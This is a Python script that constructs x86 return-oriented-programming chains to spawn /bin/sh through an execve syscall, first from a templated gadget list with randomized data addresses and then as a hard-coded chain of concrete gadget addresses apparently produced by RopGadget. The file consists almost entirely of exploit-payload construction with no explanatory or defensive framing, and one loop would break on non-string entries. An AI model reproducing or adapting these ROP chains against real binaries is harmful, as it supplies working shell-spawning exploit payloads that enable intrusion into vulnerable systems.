#!/usr/bin/python3

from payload import *
from random import Random

def execve():
    needed = [
        # increment
        "inc eax | ret",
        # init
        "xor eax, eax | ret",
        # patch
        "mov [edx], eax | ret",
        # stack
        "pop eax | ret", "pop ebx | ret", "pop ecx | ret", "pop edx | ret", "pop ebp | ret",
        # syscall
        "int 0x80", "sysenter",
        ".data"
    ]

    gadgets = {
        # increment
        "inc eax | ret" : ["inc1", "inc2", "inc3", "inc4"],
        # init
        "xor eax, eax | ret" : ["xor1", "xor2", "xor3", "xor4"],
        # patch
        "mov [edx], eax | ret" : ["mov_1", "mov_2", "mov_3", "mov_4"],
        # stack
        "pop eax | ret" : ["pop_eax1", "pop_eax2", "pop_eax3", "pop_eax4"],
        "pop ebx | ret" : ["pop_ebx1", "pop_ebx2", "pop_ebx3", "pop_ebx4"],
        "pop ecx | ret" : ["pop_ecx1", "pop_ecx2", "pop_ecx3", "pop_ecx4"],
        "pop edx | ret" : ["pop_edx1", "pop_edx2", "pop_edx3", "pop_edx4"],
        "pop ebp | ret" : ["pop_ebp1", "pop_ebp2", "pop_ebp3", "pop_ebp4"],
        # syscall
        "int 0x80" : ["int0x80_1", "int0x80_2","int0x80_3","int0x80_4"],
        "sysenter" : ["sysenter1", "sysenter2", "sysenter3", "sysenter4"],
        ".data" : [".data1", ".data2", ".data3", ".data4"]
    }

    # construct present gadget list
    present = {}
    for (gadget, addrs) in gadgets.items():
        if gadget in needed:
            present[gadget] = addrs

    # if we have same len for both list
    # then we got the needed gadgets
    combining = False
    if len(present.keys()) == len(needed):
        combining = True
    if combining == False:
        return []

    rand = Random()
    idxAddr = rand.randrange(0, len(gadgets[".data"]))
    # get 3 random addresses
    datas = Rop.get_addrs(256, 1024, 3)
    gadgets[".data"] = {
        ".data{0}".format(0) : datas[0],
        ".data{0}".format(1) : datas[1],
        ".data{0}".format(2) : datas[2]
    }

    # template
    ropstack_template = [
        "pop edx | ret",
        ".data0",
        "pop eax | ret",
        "/bin",
        "mov [edx], eax | ret",

        "pop edx | ret",
        ".data1",
        "pop eax | ret",
        "//sh",
        "mov [edx], eax | ret",

        "pop edx | ret",
        ".data2",
        "xor eax, eax | ret",
        "mov [edx], eax | ret",
        "pop ebx | ret",
        ".data0",
        "pop ecx | ret",
        ".data2",
        "pop edx | ret",
        ".data2",
        "xor eax, eax | ret",
    ]
    # set eax to SYS_EXECVE = 0xb
    ropstack_template.extend(["inc eax | ret"] * 11)
    ropstack_template.append("int 0x80")

    # constructing ropstack for real
    ropstack = []
    for idxGadget in ropstack_template:
        if not isinstance(idxGadget, str):
            ropstack.append(idxGadget)

        # gadgets
        if idxGadget.find('.data') == 0:
            addr = gadgets['.data'][idxGadget]
            ropstack.append(addr)
        elif idxGadget in gadgets.keys():
            addrs = gadgets[idxGadget]
            # pick a random address from list
            idxAddr = rand.randrange(0, len(addrs))
            addr = addrs[idxAddr]
            ropstack.append(addr)
        else:
            ropstack.append(idxGadget)

    return (gadgets, ropstack)

combo_execve_int80h_gadgets = {
        # increment
        "inc eax | ret" : [0x08048ca6],
        # init
        "xor eax, eax | ret" : [0x0804aae0],
        # patch
        "mov [edx], eax | ret" : [0x080798dd],
        # stack
        "pop eax | ret" : [0x080a4be6],
        "pop ebx | ret" : [0x08048144],
        "pop ecx | ret" : [0x080c5dd2],
        "pop edx | ret" : [0x08052bba],
        "pop ebp | ret" : [0x080483f5],
        # syscall
        "int 0x80" : [0x08048ca8],
        "sysenter" : [0x08048caa],
        ".data" : [0x080cd9a0]
}

# execve /bin/sh generated by RopGadget v3.3
comboint0x80 = [
    0x08052bba, # pop %edx | ret
    0x080cd9a0, # @ .data
    0x080a4be6, # pop %eax | ret
    "/bin",
    0x080798dd, # mov %eax,(%edx) | ret

    0x08052bba, # pop %edx | ret
    0x080cd9a4, # @ .data + 4
    0x080a4be6, # pop %eax | ret
    "//sh",
    0x080798dd, # mov %eax,(%edx) | ret

    0x08052bba, # pop %edx | ret
    0x080cd9a8, # @ .data + 8
    0x0804aae0, # xor %eax,%eax | ret
    0x080798dd, # mov %eax,(%edx) | ret
    0x08048144, # pop %ebx | ret
    0x080cd9a0, # @ .data
    0x080c5dd2, # pop %ecx | ret
    0x080cd9a8, # @ .data + 8
    0x08052bba, # pop %edx | ret
    0x080cd9a8, # @ .data + 8
    0x0804aae0, # xor %eax,%eax | ret
    0x08048ca6, # inc %eax | ret
    0x08048ca6, # inc %eax | ret
    0x08048ca6, # inc %eax | ret
    0x08048ca6, # inc %eax | ret
    0x08048ca6, # inc %eax | ret
    0x08048ca6, # inc %eax | ret
    0x08048ca6, # inc %eax | ret
    0x08048ca6, # inc %eax | ret
    0x08048ca6, # inc %eax | ret
    0x08048ca6, # inc %eax | ret
    0x08048ca6, # inc %eax | ret
    0x08048ca8 # int $0x80
]


(gadgets, ropstack) = execve()

print("execve ported")
Rop.show_ropstack(gadgets, ropstack)

print("execve Jonatan")
Rop.show_ropstack(combo_execve_int80h_gadgets, comboint0x80)
